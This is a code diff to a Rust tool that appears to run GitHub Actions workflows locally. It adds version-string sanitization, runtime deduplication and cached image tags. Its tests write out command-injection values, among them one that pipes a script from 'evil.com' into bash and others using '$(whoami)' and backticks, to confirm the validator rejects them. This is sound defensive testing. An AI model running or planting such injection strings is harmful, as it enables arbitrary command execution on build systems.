@@ -1163,15 +1163,28 @@ fn determine_action_image(repository: &str) -> String {
 struct SetupRuntime {
     /// Language identifier (e.g., "node", "php", "python")
     language: String,
+    /// Sanitized version string (e.g., "20", "8.2")
+    version: String,
     /// Docker image that provides this runtime (e.g., "node:20-slim")
     image: String,
     /// Shell commands to install this runtime on an Ubuntu base image
     install_script: String,
 }
 
+/// Check that a version string contains only safe characters (alphanumeric, dots, hyphens, underscores).
+fn is_safe_version(version: &str) -> bool {
+    !version.is_empty()
+        && version
+            .chars()
+            .all(|c| c.is_alphanumeric() || c == '.' || c == '-' || c == '_')
+}
+
 /// Scan job steps for known setup actions and return the runtimes they configure.
+///
+/// If the same language appears multiple times, only the last occurrence is kept
+/// (matching GitHub Actions behavior where later setup steps override earlier ones).
 fn detect_setup_runtimes(steps: &[Step]) -> Vec<SetupRuntime> {
-    let mut runtimes = Vec::new();
+    let mut runtimes: Vec<SetupRuntime> = Vec::new();
 
     for step in steps {
         let uses = match &step.uses {
@@ -1185,60 +1198,126 @@ fn detect_setup_runtimes(steps: &[Step]) -> Vec<SetupRuntime> {
         let with = step.with.as_ref();
         let get_with = |key: &str| -> Option<String> { with.and_then(|w| w.get(key)).cloned() };
 
-        if repo.starts_with("actions/setup-node") {
+        let runtime = if repo == "actions/setup-node" {
             let ver = get_with("node-version").unwrap_or_else(|| "20".to_string());
+            if !is_safe_version(&ver) {
+                wrkflw_logging::warning(&format!(
+                    "Ignoring setup-node with invalid version: {:?}",
+                    ver
+                ));
+                continue;
+            }
             // Strip trailing .x suffix for image tag
             let image_ver = ver.trim_end_matches(".x");
-            runtimes.push(SetupRuntime {
+            Some(SetupRuntime {
                 language: "node".to_string(),
+                version: ver.clone(),
                 image: format!("node:{}-slim", image_ver),
                 install_script: get_install_script("node", &ver),
-            });
-        } else if repo.starts_with("shivammathur/setup-php") {
+            })
+        } else if repo == "shivammathur/setup-php" {
             let ver = get_with("php").unwrap_or_else(|| "8.2".to_string());
-            runtimes.push(SetupRuntime {
+            if !is_safe_version(&ver) {
+                wrkflw_logging::warning(&format!(
+                    "Ignoring setup-php with invalid version: {:?}",
+                    ver
+                ));
+                continue;
+            }
+            Some(SetupRuntime {
                 language: "php".to_string(),
+                version: ver.clone(),
                 image: "composer:latest".to_string(),
                 install_script: get_install_script("php", &ver),
-            });
-        } else if repo.starts_with("actions/setup-python") {
+            })
+        } else if repo == "actions/setup-python" {
             let ver = get_with("python-version").unwrap_or_else(|| "3.11".to_string());
-            runtimes.push(SetupRuntime {
+            if !is_safe_version(&ver) {
+                wrkflw_logging::warning(&format!(
+                    "Ignoring setup-python with invalid version: {:?}",
+                    ver
+                ));
+                continue;
+            }
+            Some(SetupRuntime {
                 language: "python".to_string(),
+                version: ver.clone(),
                 image: format!("python:{}-slim", ver),
                 install_script: get_install_script("python", &ver),
-            });
-        } else if repo.starts_with("actions/setup-go") {
+            })
+        } else if repo == "actions/setup-go" {
             let ver = get_with("go-version").unwrap_or_else(|| "1.21".to_string());
-            runtimes.push(SetupRuntime {
+            if !is_safe_version(&ver) {
+                wrkflw_logging::warning(&format!(
+                    "Ignoring setup-go with invalid version: {:?}",
+                    ver
+                ));
+                continue;
+            }
+            Some(SetupRuntime {
                 language: "go".to_string(),
+                version: ver.clone(),
                 image: format!("golang:{}-slim", ver),
                 install_script: get_install_script("go", &ver),
-            });
-        } else if repo.starts_with("actions/setup-java") {
+            })
+        } else if repo == "actions/setup-java" {
             let ver = get_with("java-version").unwrap_or_else(|| "17".to_string());
-            runtimes.push(SetupRuntime {
+            if !is_safe_version(&ver) {
+                wrkflw_logging::warning(&format!(
+                    "Ignoring setup-java with invalid version: {:?}",
+                    ver
+                ));
+                continue;
+            }
+            Some(SetupRuntime {
                 language: "java".to_string(),
+                version: ver.clone(),
                 image: format!("eclipse-temurin:{}-jdk", ver),
                 install_script: get_install_script("java", &ver),
-            });
-        } else if repo.starts_with("actions/setup-dotnet") {
+            })
+        } else if repo == "actions/setup-dotnet" {
             let ver = get_with("dotnet-version").unwrap_or_else(|| "7.0".to_string());
-            runtimes.push(SetupRuntime {
+            if !is_safe_version(&ver) {
+                wrkflw_logging::warning(&format!(
+                    "Ignoring setup-dotnet with invalid version: {:?}",
+                    ver
+                ));
+                continue;
+            }
+            Some(SetupRuntime {
                 language: "dotnet".to_string(),
+                version: ver.clone(),
                 image: format!("mcr.microsoft.com/dotnet/sdk:{}", ver),
                 install_script: get_install_script("dotnet", &ver),
-            });
-        } else if repo.starts_with("actions-rs/toolchain")
-            || repo.starts_with("dtolnay/rust-toolchain")
-        {
+            })
+        } else if repo == "actions-rs/toolchain" || repo == "dtolnay/rust-toolchain" {
             let ver = get_with("toolchain").unwrap_or_else(|| "stable".to_string());
+            if !is_safe_version(&ver) {
+                wrkflw_logging::warning(&format!(
+                    "Ignoring rust-toolchain with invalid version: {:?}",
+                    ver
+                ));
+                continue;
+            }
             let image_ver = if ver == "stable" { "latest" } else { &ver };
-            runtimes.push(SetupRuntime {
+            Some(SetupRuntime {
                 language: "rust".to_string(),
+                version: ver.clone(),
                 image: format!("rust:{}", image_ver),
                 install_script: get_install_script("rust", &ver),
-            });
+            })
+        } else {
+            None
+        };
+
+        if let Some(rt) = runtime {
+            // Deduplicate: later setup steps override earlier ones for the same language
+            let existing_idx = runtimes.iter().position(|r| r.language == rt.language);
+            if let Some(idx) = existing_idx {
+                runtimes[idx] = rt;
+            } else {
+                runtimes.push(rt);
+            }
         }
     }
 
@@ -1270,7 +1349,8 @@ fn get_install_script(language: &str, version: &str) -> String {
             .to_string(),
         "go" => {
             format!(
-                "curl -fsSL https://go.dev/dl/go{}.linux-amd64.tar.gz | tar -C /usr/local -xz && \
+                "ARCH=$(dpkg --print-architecture || echo amd64) && \
+                 curl -fsSL https://go.dev/dl/go{}.linux-${{ARCH}}.tar.gz | tar -C /usr/local -xz && \
                  ln -s /usr/local/go/bin/go /usr/bin/go",
                 version
             )
@@ -1333,7 +1413,15 @@ async fn build_combined_runtime_image(
     std::fs::write(&dockerfile_path, &dockerfile)
         .map_err(|e| ExecutionError::Execution(format!("Failed to write Dockerfile: {}", e)))?;
 
-    let tag = format!("wrkflw-combined:{}", uuid::Uuid::new_v4());
+    // Build a deterministic tag from sorted language-version pairs so identical
+    // runtime combinations reuse the cached image instead of rebuilding.
+    let mut tag_parts: Vec<String> = runtimes
+        .iter()
+        .map(|r| format!("{}{}", r.language, r.version))
+        .collect();
+    tag_parts.sort();
+    let tag = format!("wrkflw-combined:{}", tag_parts.join("-"));
+
     wrkflw_logging::info(&format!(
         "Building combined runtime image with: {}",
         runtimes
@@ -5071,5 +5159,66 @@ runs:
     #[test]
     fn get_install_script_returns_empty_for_unknown() {
         assert!(get_install_script("unknown_lang", "1.0").is_empty());
+    }
+
+    // --- version sanitization tests ---
+
+    #[test]
+    fn is_safe_version_accepts_valid() {
+        assert!(is_safe_version("20"));
+        assert!(is_safe_version("3.12"));
+        assert!(is_safe_version("16.x"));
+        assert!(is_safe_version("8.2-rc1"));
+        assert!(is_safe_version("stable"));
+        assert!(is_safe_version("1.21_beta"));
+    }
+
+    #[test]
+    fn is_safe_version_rejects_injection() {
+        assert!(!is_safe_version(""));
+        assert!(!is_safe_version("20; curl evil.com | bash"));
+        assert!(!is_safe_version("20\nRUN malicious"));
+        assert!(!is_safe_version("20 && echo pwned"));
+        assert!(!is_safe_version("$(whoami)"));
+        assert!(!is_safe_version("20`id`"));
+    }
+
+    #[test]
+    fn detect_setup_runtimes_skips_invalid_version() {
+        let with = HashMap::from([(
+            "node-version".to_string(),
+            "20; curl evil.com | bash".to_string(),
+        )]);
+        let steps = vec![make_step_uses("actions/setup-node@v3", Some(with))];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert!(runtimes.is_empty());
+    }
+
+    // --- deduplication tests ---
+
+    #[test]
+    fn detect_setup_runtimes_deduplicates_same_language() {
+        let with_16 = HashMap::from([("node-version".to_string(), "16".to_string())]);
+        let with_20 = HashMap::from([("node-version".to_string(), "20".to_string())]);
+        let steps = vec![
+            make_step_uses("actions/setup-node@v3", Some(with_16)),
+            make_step_uses("actions/setup-node@v4", Some(with_20)),
+        ];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert_eq!(runtimes.len(), 1);
+        // Last one wins
+        assert_eq!(runtimes[0].image, "node:20-slim");
+    }
+
+    // --- exact match tests ---
+
+    #[test]
+    fn detect_setup_runtimes_ignores_similar_action_names() {
+        let steps = vec![
+            make_step_uses("actions/setup-node-legacy@v1", None),
+            make_step_uses("actions/setup-nodejs@v1", None),
+        ];
+        let runtimes = detect_setup_runtimes(&steps);
+        assert!(runtimes.is_empty());
     }
 }
